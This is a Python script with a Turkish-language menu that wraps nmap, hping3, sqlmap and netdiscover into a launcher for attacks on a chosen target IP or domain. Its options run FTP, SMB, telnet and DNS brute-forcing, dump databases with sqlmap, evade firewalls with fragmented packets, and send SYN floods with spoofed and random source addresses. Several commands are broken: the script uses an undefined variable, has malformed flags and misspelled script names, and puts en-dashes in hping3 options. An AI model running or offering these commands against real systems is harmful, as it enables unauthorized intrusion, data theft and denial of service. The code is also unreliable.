#! /usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import random
import py_compile

os.system("sudo apt-get install hping3")
os.system("sudo apt-get install netdiscover")
os.system("sudo apt-get install nmap")
os.system("sudo apt-get install searchsploit")
os.system("sudo apt-get install sqlmap ")
os.system("sudo apt-get install figlet")
os.system("clear")
os.system("figlet port ve sql tarama")
hedefip = raw_input("hedef ip veya aralığı :")
hedefadress = raw_input("website adress/domain :")
port = raw_input("port :")
port1 = raw_input("1.port :")
print("""
port tarama 

1) servis ve versiyon bilgisi
2) isletim sistemi bilgisi 
3) sql acik tarama
4) agda ayakta olan pcler
5) agda olan acık ip adresi 
6) nmap ile servis versiyon taraması
7) netdiscover agı ici ip ve mac tepiti
8) ftp bruteforce islemi
9) smmb bruteforce
10)telnet Brute
11)dns bruteforce
12)port için uygun exploit taramasi
13)guvenlik islemi
14)nmap irc backdoor taramasi
15)nmap kesif komuutu
16)nmap poodle bug taraması
17)website haritasi
18)sql database çekme islemi
19)hping3 kullanımı
20)24 işlem ile birliktte kullanılması onerilir ...hping3 
21)hping3 l.2
22)hping3 l.3
23)paketleri bolerek güvenilk duvarı bypass
24)nmap hping3 güvenlik duvarı bypass
25)nmap ile kritik bilgileri alma
""")
islemno = raw_input("islem numarasi gir :")
if(islemno=="1"):
        os.system("nmap -sS -sV " + hedefip)
elif(islemno=="2"):
        os.system("nmap -0 " + hedefip)
elif(islemno=="3"):
        os.system("nmap -sV --script=/usr/share/nmap/scripts/http-sql-injection.nse" " "+ hedefadress + " -p " + port)
elif(islemno=="4"):
		os.system("nmap -sP " " "+ hedefip + "-n -oN sonuclar")
elif(islemno=="5"):
		os.system("nmap -sn -n -v --open -O " + hedefip)
elif(islemno=="6"):
		os.system("nmap -sS -sV -sC -n -v -p " " " + port + " " + hedefip )
elif(islemno=="7"):
		ag = raw_input("wifi mi ethernet mi :")
		os.system(" netdiscover -i" + ag + " "+hedefip)
elif(islemno=="8"):
        user = raw_input("user dosyası ")
        pasword = raw_input("password dosyası")
        os.system("nmap -p21 --script ftp-brute.nse --script-args userdb="+user +" " "passdb="+passdb + " " + hedefip)
elif(islemno=="9"):
        os.system("nmap -p445 --script smb-brute.nse" +hedefip)
elif(islemno=="10"):
        os.system("nmap -23 --script telnet-brute.nse" +hedefip)
elif(islemno=="11"):
        os.system("nmap -Pn --script=dns-brute" " " +hedefadress)
elif(islemno=="12"):
        os.system("nmap -sV --script-args vulscandb=exploitdb" " " + hedefip )
elif(islemno=="13"):
        os.system("nmap --script=ssl-heartblead" " " +hedefip)
elif(islemno=="14"):
        os.system("nmap -sV --script=irc-unrealircd-backdoor -p 6667 " " " + hedefip)
elif(islemno=="15"):
        os.system("nmap -sV --script=banner " " "+hedefip)
elif(islemno=="16"):
        os.system("nmap --script ssl-poodle "" "+hedefip)
elif(islemno=="20"):
        os.system("hping3 -S "" "+hedefip+" ""-c 100 -p ++1")
elif(islemno=="23"):
        os.system("nmap -f -f -sT -sV " " "+hedefip+" " "-O -vv -T4 -A")
elif(islemno=="24"):
        os.system("nmap --script=firewalk --traceroute "" "+hedefip)
elif(islemno=="25"):
        os.system("nmap -Pn -sS " " "+hedefip+"" "-A")
elif(islemno=="17"):
        os.system("nmap -Pn --script=http-sitemap-generator"" "+hedefip)
elif(islemno=="18"):
        os.system("sqlmap -u " " "+hedefadress+" ""--dbs --batch")
elif(islemno=="19"):
        os.system("hping3 –syn -p 80 "" "+hedefadress+" ""–spoof 5.5.5.5")
elif(islemno=="21"):
        os.system("hping3 -c 10 -d 1200 -S -p 445  – – flood  – – rand-source "" "+hedefip)
elif(islemno=="22"):
        os.system("hping3 -S "" "+hedefip+" "" – – scan 445 -V")
else:
        print("""hata""")

        
istek = raw_input("yeniden arama yapacak misin ? (y/n): ")
if(istek=="y"):
        os.system("python lancelot.py  ")
elif(istek=="n"):
        print("beceriksiz:")
